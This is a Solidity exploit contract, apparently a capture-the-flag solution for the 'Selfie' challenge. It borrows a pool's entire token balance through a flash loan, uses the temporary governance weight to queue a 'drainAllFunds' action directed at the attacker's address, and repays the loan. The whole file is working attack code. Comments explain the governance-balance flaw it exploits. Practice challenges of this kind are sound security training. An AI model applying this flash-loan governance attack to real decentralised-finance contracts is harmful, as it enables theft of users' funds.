pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "../selfie/SimpleGovernance.sol";

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

contract SelfieAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    IERC20 token;
    SimpleGovernance governance;
    ISelfiePool pool;
    address attackerEOA;
    uint256 public actionId;

    constructor(
        IERC20 _token,
        SimpleGovernance _governance,
        ISelfiePool _pool
    ) public {
        token = _token;
        governance = _governance;
        pool = _pool;
    }

    function attack() public {
        uint256 flashLoanBalance = token.balanceOf(address(pool));
        attackerEOA = msg.sender;

        // get flash loan
        pool.flashLoan(flashLoanBalance);
    }

    // called by ISelfiePool::flashLoan
    function receiveTokens(
        address, /* tokenAddress */
        uint256 amount
    ) external {
        // we can now queue a government action to drain all funds to attacker account
        // because it checks the balance of governance tokens (which is the same token as the pool token)
        bytes memory drainAllFundsPayload =
            abi.encodeWithSignature("drainAllFunds(address)", attackerEOA);
        // store actionId so we can later execute it
        actionId = governance.queueAction(
            address(pool),
            drainAllFundsPayload,
            0
        );

        // pay back to flash loan sender
        token.transfer(address(pool), amount);
    }
}
